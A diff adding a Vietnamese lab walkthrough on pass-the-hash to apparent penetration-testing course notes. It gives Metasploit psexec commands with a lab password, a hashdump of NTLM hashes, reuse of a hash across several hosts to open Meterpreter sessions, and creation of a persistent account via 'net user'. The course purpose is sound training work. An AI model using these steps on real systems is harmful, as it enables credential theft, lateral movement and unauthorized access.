@@ -5393,3 +5393,216 @@ lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 520
 Như bạn thấy, bộ công cụ Impacket cung cấp rất nhiều khả năng. Chúng tôi chỉ đề cập đến bốn công cụ nhưng còn nhiều công cụ khác nữa! Hãy xem tại đây để biết mô tả về nhiều công cụ khác.
 
 Chúng ta sẽ sử dụng những công cụ này và một vài công cụ khác của Impacket trong suốt khóa học này.
+
+# Lab 4.3. Truyền tham số băm (Pass-the-Hash)
+
+## Mục tiêu
+
+- Sử dụng tấn công pass-the-hash thông qua psexecmô-đun của Metasploit để tải Meterpreter lên máy mục tiêu.
+
+- Để xem cách chúng ta có thể xác thực vào máy tính Windows mục tiêu chỉ bằng cách sử dụng mã băm, mà không cần sử dụng mật khẩu thực tế.
+
+## Thiết lập phòng thí nghiệm
+
+Các máy ảo được sử dụng:
+
+- Slingshot Linux.
+
+Bạn có thể ping địa chỉ 10.130.10.25 từ máy ảo Slingshot Linux:
+
+```bash
+ping -c 4 10.130.10.25
+```
+
+![alt text](IMG/LAB4/LAB4.2/image.png)
+
+## Hướng dẫn thực hành từng bước
+
+Trong bài thực hành này, bạn sẽ tấn công máy 10.130.10.5bằng thông tin đăng nhập mà chúng ta đã tìm thấy trước đó (bgreen/ Password1). Bạn sẽ lấy được mã băm mật khẩu, sau đó thử sử dụng các mã băm đó để truy cập vào các hệ thống khác.
+
+Mục đích chính của bài thực hành này là giúp bạn lấy được các mã băm LM và NT và sử dụng chúng để truy cập quản trị vào máy mục tiêu mà không cần phải bẻ khóa mật khẩu. Lưu ý rằng trong suốt quá trình thực hiện bài thực hành này, bạn không cần phải biết giá trị thực của mật khẩu tài khoản khác. Bạn chỉ cần sử dụng dạng mã băm của nó để truy cập.
+
+![alt text](IMG/LAB4/LAB4.2/image-1.png)
+
+### 1. Thu được mã băm
+
+Sử dụng Metasploit và mô-đun `psexec` để thiết lập phiên kết nối trên 10.130.10.25 bằng thông tin đăng nhập mà chúng ta đã tìm thấy trước đó. Đầu tiên, hãy khởi động Metasploit.
+
+```bash
+msfconsole
+```
+
+Đã cấu hình Metasploit để nhắm mục tiêu vào 10.130.10.5 bằng cách sử dụng thông tin đăng nhập mà chúng ta đã tìm thấy trước đó.
+
+```bash
+use exploit/windows/smb/psexec
+set smbuser bgreen
+set smbpass Password1
+set smbdomain hiboxy
+set rhosts 10.130.10.25
+set lhost eth0
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-2.png)
+
+Hãy xác nhận lại cài đặt của bạn trong Metasploit.
+
+```bash
+show options
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-4.png)
+
+Đã đến lúc khai thác mục tiêu!
+
+```bash
+run
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-5.png)
+
+Hãy lấy các mã băm bằng mô-đun `post/windows/gather/hashdump` này.
+
+```bash
+run post/windows/gather/hashdump
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-6.png)
+
+Chúng ta sẽ xem xét dòng bắt đầu bằng `antivirus`. Tài khoản này trông khá chung chung, vì vậy hãy thử sử dụng mã băm đó trên các hệ thống khác.
+
+### 2. Sử dụng hàm băm
+
+Chúng ta sẽ sử dụng psexeclại mô-đun này. Trước tiên, hãy thiết lập tài khoản.
+
+```bash
+background
+set smbuser john
+unset smbdomain
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-7.png)
+
+```bash
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9679f78eec859fdedb8c208c8fcf4abf:::
+sec560:1202:aad3b435b51404eeaad3b435b51404ee:1331a486325907559cf7bd97946b46d0:::
+notadmin:1203:aad3b435b51404eeaad3b435b51404ee:c62638b38308e651b21a0f2ccab3ac9b:::
+clark:1210:aad3b435b51404eeaad3b435b51404ee:1331a486325907559cf7bd97946b46d0:::
+antivirus:1217:aad3b435b51404eeaad3b435b51404ee:12ae851bc310750f4ce00e3c7ef9b658:::
+john:1218:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+```
+
+Chúng ta cần đặt mật khẩu cho tài khoản này. Chúng ta không biết mật khẩu gốc, vì vậy chúng ta cần sử dụng các mã băm. Cuộn lên trên và lấy các mã băm (cả LM và NT, bao gồm cả mã `:` ở giữa). Sau đó dán mã băm bằng dấu chấm `smbpassword`.
+
+```bash
+set smbpass aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-8.png)
+
+Hãy nhắm mục tiêu vào tất cả các máy chủ Windows trong môi trường. Hãy nhớ lại từ kết quả quét Nmap của chúng ta rằng có 7 máy chủ khác (không tính hệ thống mà chúng ta có quyền truy cập) đang lắng nghe trên cổng 445.
+
+Chúng ta có thể thiết lập `rhosts` tùy chọn để nhắm mục tiêu vào tất cả các máy chủ này.
+
+```bash
+set rhosts 10.130.10.10,25,45
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-9.png)
+
+Xác nhận các tùy chọn.
+
+```bash
+show options
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-11.png)
+
+Giờ hãy thử sử dụng mã băm này và khai thác hệ thống!
+
+### 3: Khai thác
+
+Cuối cùng, hãy chạy runlệnh để tấn công các mục tiêu:
+
+```bash
+run
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-12.png)
+
+Bạn sẽ thấy hầu hết các máy chủ đều cung cấp cho bạn STATUS_ACCESS_DENIED, nhưng hai trong số đó yêu cầu xác thực. Các dòng được tô sáng ở trên cho thấy chúng ta có quyền truy cập vào hệ thống .21 và .45 chỉ bằng cách sử dụng mã băm!
+
+Nếu cuộc tấn công pass-the-hash thành công, bạn sẽ có quyền truy cập Meterpreter vào các máy mục tiêu. Bạn có thể xác nhận điều này bằng cách xem nhật ký phiên của mình.
+
+```bash
+sessions -l
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-13.png)
+
+### 4. Vỏ Meterpreter
+
+
+Theo như Metasploit và các mục tiêu, bạn đã xác thực vào máy một cách hợp lệ. Bạn chỉ sử dụng mã băm thay vì mật khẩu.
+
+Hãy chọn một trong các phiên của bạn (số phiên có thể khác với ví dụ) và tương tác với nó.
+
+```bash
+sessions -i 2
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-14.png)
+
+Giờ bạn có thể chạy bất kỳ lệnh Meterpreter nào mà chúng ta đã thảo luận trước đó trong khóa học.
+
+```bash
+getuid
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-15.png)
+
+```bash
+ifconfig
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-16.png)
+
+Hãy sử dụng quyền truy cập này của mục tiêu để tạo tài khoản trên máy bằng cách khởi chạy `cmd.exe` shell, sau đó sử dụng nó `net user` để tạo tài khoản và đặt mật khẩu.
+
+![alt text](IMG/LAB4/LAB4.2/image-17.png)
+
+```bash
+whoami
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-18.png)
+
+```bash
+net user tungdvan 1234@abcd /add
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-19.png)
+
+Hãy cùng xem lại các tài khoản đã được tạo trên máy tính này cho đến nay:
+
+```bash
+net user
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-20.png)
+
+Để hoàn thành bài thực hành, bạn chỉ cần đóng `exit` shell, phiên Meterpreter và `msfconsole` phiên làm việc của mình.
+
+```bash
+exit
+exit -y
+```
+
+![alt text](IMG/LAB4/LAB4.2/image-21.png)
+
+## Phần kết luận
+
+Tóm lại, trong bài thực hành này, bạn đã xác thực vào máy mục tiêu thông qua SMB với tư cách người dùng quản trị chỉ bằng mã băm của quản trị viên đó (không phải mật khẩu). Bạn đã truyền mã băm bằng psexecmô-đun của Metasploit. Những kỹ thuật này rất hữu ích cho các chuyên gia kiểm thử xâm nhập đã lấy được mã băm từ môi trường mục tiêu và có quyền truy cập *SMB vào các máy Windows mục tiêu.
